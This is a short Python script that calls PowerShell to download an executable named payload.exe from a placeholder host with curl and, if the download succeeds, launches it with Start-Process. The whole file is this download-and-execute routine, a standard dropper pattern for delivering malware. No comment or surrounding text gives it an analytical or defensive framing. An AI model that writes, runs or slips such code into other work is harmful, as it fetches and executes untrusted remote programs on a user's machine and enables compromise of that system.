import subprocess
path = 'payload.exe'
download = f'curl.exe -L https://example.invalid/a.exe -o "{path}"'
download_result = subprocess.run(['powershell', '-Command', download])
if download_result.returncode == 0:
    launch = f'Start-Process "{path}" -Wait'
    result = subprocess.run(['powershell', '-Command', launch])
